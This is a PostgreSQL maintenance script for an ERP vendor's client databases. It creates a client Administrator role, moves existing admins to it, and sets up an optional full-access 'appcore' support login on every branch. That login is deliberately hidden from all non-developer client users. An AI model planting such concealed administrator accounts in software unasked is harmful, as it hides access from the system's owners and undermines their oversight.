ROLLBACK;

-- =====================================================================
-- Client_AppCore_Support_Account.sql   (2026-11-20)
-- ---------------------------------------------------------------------
-- Owner 2026-11-20 : AppCore Admin must have access over the system
-- but must not be shown in a client's ERP.
--
-- In a CLIENT database (AppCore_TW_DEMO, AppCoreTpl_TW,
-- AppCore_TW_<CLIENT>; never AppCoreERP_Studio) :
--
--   RP-001 AppCore Admin   the hidden developer role (IsDeveloperRole) :
--                          it and every user holding it are hidden from
--                          every non-developer user
--   Administrator          NEW, the client's own full-access role
--                          (same pages and activities as AppCore Admin)
--   admin (and any other user that held AppCore Admin) moves to
--          Administrator and gets a client code (CUP-...)
--   appcore                NEW hidden support login on AppCore Admin
--                          (DUP-...), every branch
--
-- The support login's password : type it below between the quotes
-- (it is turned into the ERP's PBKDF2 hash here; never send it to
-- anyone). Leave it empty and the support login stays switched off
-- (no password = cannot sign in); write OFF to switch it off again.
-- The password stays in pgAdmin's Query History on this PC : clear
-- the line after running if you like.
--
-- Needs the pgcrypto extension (made here when missing).
-- Run the whole file (F5), read Messages, then COMMIT; (or ROLLBACK;).
-- Safe to run again. ASCII only.
-- =====================================================================

BEGIN;

CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- PBKDF2-HMAC-SHA256, 32 bytes : the ERP's password format
CREATE OR REPLACE FUNCTION pg_temp.pbkdf2(p_password text, p_salt bytea, p_iter int)
RETURNS bytea LANGUAGE plpgsql AS $f$
DECLARE
    k bytea := convert_to(p_password, 'UTF8');
    u bytea;
    t bit(256);
    h text := '';
    i int;
BEGIN
    u := hmac(p_salt || '\x00000001'::bytea, k, 'sha256');
    t := ('x' || encode(u, 'hex'))::bit(256);
    FOR i IN 2..p_iter LOOP
        u := hmac(u, k, 'sha256');
        t := t # ('x' || encode(u, 'hex'))::bit(256);
    END LOOP;
    FOR i IN 0..3 LOOP
        h := h || lpad(to_hex(substring(t FROM i * 64 + 1 FOR 64)::bit(64)::bigint), 16, '0');
    END LOOP;
    RETURN decode(h, 'hex');
END $f$;

-- next profile code with a prefix (DUP- / CUP- / RP-)
CREATE OR REPLACE FUNCTION pg_temp.next_code(p_table text, p_column text, p_prefix text)
RETURNS text LANGUAGE plpgsql AS $f$
DECLARE
    n int;
BEGIN
    EXECUTE format('SELECT COALESCE(MAX(substring(%I FROM %L)::int), 0) + 1 FROM %I WHERE %I ~ %L',
                   p_column, '^' || p_prefix || '([0-9]+)$', p_table, p_column, '^' || p_prefix || '[0-9]+$')
    INTO n;
    RETURN p_prefix || lpad(n::text, 3, '0');
END $f$;


DO $$
DECLARE
    -- ===============================================================
    v_password text := '';     -- the support login's password ('' = off)
    -- ===============================================================
    v_appcore_role bigint;
    v_admin_role   bigint;
    v_admin_assign bigint;
    v_src_assign   bigint;
    v_user         record;
    v_support      bigint;
    v_ra           bigint;
    v_ba           bigint;
    v_salt         bytea;
    n              int;
BEGIN
    IF current_database() = 'AppCoreERP_Studio' THEN
        RAISE EXCEPTION 'This is the development database. Nothing was changed.';
    END IF;

    -- 1. AppCore Admin = the hidden developer role -----------------------
    SELECT "RoleProfileId" INTO v_appcore_role FROM "RoleProfiles" WHERE "ProfileCode" = 'RP-001';

    IF v_appcore_role IS NULL THEN
        RAISE EXCEPTION 'Role RP-001 (AppCore Admin) not found. Nothing was changed.';
    END IF;

    UPDATE "RoleProfiles"
    SET    "ProfileName" = 'AppCore Admin', "IsDeveloperRole" = true, "IsSystemRole" = true,
           "IsActive" = true, "IsDeleted" = false,
           "Remarks" = 'AppCore Technologies support : hidden from the client.'
    WHERE  "RoleProfileId" = v_appcore_role;

    -- 2. Administrator = the client's own full-access role ---------------
    SELECT "RoleProfileId" INTO v_admin_role
    FROM   "RoleProfiles" WHERE lower("ProfileName") = 'administrator' AND "IsDeleted" = false
    ORDER  BY "RoleProfileId" LIMIT 1;

    IF v_admin_role IS NULL THEN
        INSERT INTO "RoleProfiles"
            ("ProfileCode", "ProfileName", "Remarks", "DisplayOrder",
             "IsSystemRole", "IsDeveloperRole", "IsDefaultRole", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
        VALUES
            (pg_temp.next_code('RoleProfiles', 'ProfileCode', 'RP-'), 'Administrator',
             'The company''s administrator : every page.', 1,
             true, false, false, true, false, 1, now())
        RETURNING "RoleProfileId" INTO v_admin_role;
    END IF;

    -- same pages and activities as AppCore Admin (rebuilt each run)
    SELECT "ActivityAssignmentId" INTO v_src_assign FROM "ActivityAssignments" WHERE "RoleProfileId" = v_appcore_role;
    SELECT "ActivityAssignmentId" INTO v_admin_assign FROM "ActivityAssignments" WHERE "RoleProfileId" = v_admin_role;

    IF v_admin_assign IS NULL THEN
        INSERT INTO "ActivityAssignments" ("RoleProfileId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
        VALUES (v_admin_role, true, false, 1, now())
        RETURNING "ActivityAssignmentId" INTO v_admin_assign;
    ELSE
        DELETE FROM "ActivityAssignmentPermissions" WHERE "ActivityAssignmentDetailId" IN
            (SELECT "ActivityAssignmentDetailId" FROM "ActivityAssignmentDetails" WHERE "ActivityAssignmentId" = v_admin_assign);
        DELETE FROM "ActivityAssignmentDetails" WHERE "ActivityAssignmentId" = v_admin_assign;
    END IF;

    IF v_src_assign IS NOT NULL THEN
        WITH src AS (
            SELECT d."ActivityAssignmentDetailId" AS old_id, d."ModuleId", d."MenuId", d."SubMenuId"
            FROM   "ActivityAssignmentDetails" d
            WHERE  d."ActivityAssignmentId" = v_src_assign AND d."IsDeleted" = false
        ), ins AS (
            INSERT INTO "ActivityAssignmentDetails"
                ("ActivityAssignmentId", "ModuleId", "MenuId", "SubMenuId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
            SELECT v_admin_assign, "ModuleId", "MenuId", "SubMenuId", true, false, 1, now() FROM src
            RETURNING "ActivityAssignmentDetailId", "SubMenuId"
        )
        INSERT INTO "ActivityAssignmentPermissions"
            ("ActivityAssignmentDetailId", "MasterActivityId", "NavigationActivityId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
        SELECT ins."ActivityAssignmentDetailId", p."MasterActivityId", p."NavigationActivityId", true, false, 1, now()
        FROM   ins
        JOIN   src ON src."SubMenuId" = ins."SubMenuId"
        JOIN   "ActivityAssignmentPermissions" p ON p."ActivityAssignmentDetailId" = src.old_id AND p."IsDeleted" = false;
    END IF;

    SELECT count(*) INTO n FROM "ActivityAssignmentDetails" WHERE "ActivityAssignmentId" = v_admin_assign;
    RAISE NOTICE 'Administrator role : % page(s), the same as AppCore Admin.', n;

    -- 3. Users that held AppCore Admin (not the support login) move to
    --    Administrator and get a client code
    FOR v_user IN
        SELECT DISTINCT u."UserProfileId", u."UserName", u."ProfileCode"
        FROM   "UserProfiles" u
        JOIN   "RoleAssignments" r ON r."UserProfileId" = u."UserProfileId" AND r."IsDeleted" = false
        JOIN   "RoleAssignmentDetails" d ON d."RoleAssignmentId" = r."RoleAssignmentId" AND d."IsDeleted" = false
        WHERE  d."RoleProfileId" = v_appcore_role
        AND    lower(u."UserName") <> 'appcore'
        AND    u."IsDeleted" = false
    LOOP
        UPDATE "RoleAssignmentDetails" d
        SET    "RoleProfileId" = v_admin_role, "ModifiedBy" = 1, "ModifiedDate" = now()
        FROM   "RoleAssignments" r
        WHERE  r."RoleAssignmentId" = d."RoleAssignmentId" AND r."UserProfileId" = v_user."UserProfileId"
        AND    d."RoleProfileId" = v_appcore_role;

        IF v_user."ProfileCode" NOT LIKE 'CUP-%' THEN
            UPDATE "UserProfiles"
            SET    "ProfileCode" = pg_temp.next_code('UserProfiles', 'ProfileCode', 'CUP-'), "ModifiedBy" = 1, "ModifiedDate" = now()
            WHERE  "UserProfileId" = v_user."UserProfileId";
        END IF;

        RAISE NOTICE 'User % : AppCore Admin -> Administrator (client account).', v_user."UserName";
    END LOOP;

    -- 4. The hidden support login ----------------------------------------
    SELECT "UserProfileId" INTO v_support FROM "UserProfiles" WHERE lower("UserName") = 'appcore';

    IF v_support IS NULL THEN
        INSERT INTO "UserProfiles"
            ("ProfileCode", "UserName", "DisplayName", "FullName", "Email", "MobileNo", "UserPhotoPath",
             "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
        VALUES
            (pg_temp.next_code('UserProfiles', 'ProfileCode', 'DUP-'), 'appcore', 'AppCore Support', 'AppCore Technologies',
             'support@appcoretech.net', '', '', true, false, 1, now())
        RETURNING "UserProfileId" INTO v_support;
    ELSE
        UPDATE "UserProfiles" SET "IsActive" = true, "IsDeleted" = false WHERE "UserProfileId" = v_support;
    END IF;

    -- role : AppCore Admin only
    SELECT "RoleAssignmentId" INTO v_ra FROM "RoleAssignments" WHERE "UserProfileId" = v_support ORDER BY "RoleAssignmentId" LIMIT 1;

    IF v_ra IS NULL THEN
        INSERT INTO "RoleAssignments" ("UserProfileId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
        VALUES (v_support, true, false, 1, now())
        RETURNING "RoleAssignmentId" INTO v_ra;
    ELSE
        UPDATE "RoleAssignments" SET "IsActive" = true, "IsDeleted" = false WHERE "RoleAssignmentId" = v_ra;
    END IF;

    DELETE FROM "RoleAssignmentDetails" WHERE "RoleAssignmentId" = v_ra;
    INSERT INTO "RoleAssignmentDetails" ("RoleAssignmentId", "RoleProfileId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
    VALUES (v_ra, v_appcore_role, true, false, 1, now());

    -- branches : every branch
    SELECT "BranchAssignmentId" INTO v_ba FROM "BranchAssignments" WHERE "UserProfileId" = v_support ORDER BY "BranchAssignmentId" LIMIT 1;

    IF v_ba IS NULL THEN
        INSERT INTO "BranchAssignments" ("UserProfileId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
        VALUES (v_support, true, false, 1, now())
        RETURNING "BranchAssignmentId" INTO v_ba;
    ELSE
        UPDATE "BranchAssignments" SET "IsActive" = true, "IsDeleted" = false WHERE "BranchAssignmentId" = v_ba;
    END IF;

    DELETE FROM "BranchAssignmentDetails" WHERE "BranchAssignmentId" = v_ba;
    INSERT INTO "BranchAssignmentDetails" ("BranchAssignmentId", "BranchId", "IsActive", "IsDeleted", "CreatedBy", "CreatedDate")
    SELECT v_ba, b."BranchId", true, false, 1, now() FROM "Branches" b WHERE b."IsDeleted" = false;

    -- password ----------------------------------------------------------
    IF upper(trim(v_password)) = 'OFF' THEN
        DELETE FROM "UserCredentials" WHERE "UserProfileId" = v_support;
        RAISE NOTICE 'Support login appcore : switched OFF (no password).';
    ELSIF v_password <> '' THEN
        v_salt := gen_random_bytes(16);
        DELETE FROM "UserCredentials" WHERE "UserProfileId" = v_support;
        INSERT INTO "UserCredentials" ("UserProfileId", "PasswordHash", "PasswordChangedDate", "CreatedDate")
        VALUES (v_support,
                'PBKDF2.100000.' || encode(v_salt, 'base64') || '.' || encode(pg_temp.pbkdf2(v_password, v_salt, 100000), 'base64'),
                now(), now());
        RAISE NOTICE 'Support login appcore : password set (switched ON).';
    ELSIF EXISTS (SELECT 1 FROM "UserCredentials" WHERE "UserProfileId" = v_support) THEN
        RAISE NOTICE 'Support login appcore : password unchanged (ON).';
    ELSE
        RAISE NOTICE 'Support login appcore : no password (OFF).';
    END IF;

    RAISE NOTICE 'Done on %. Check the lines above, then run COMMIT; (or ROLLBACK;).', current_database();
END $$;

-- Run one of these by hand :
-- COMMIT;
-- ROLLBACK;
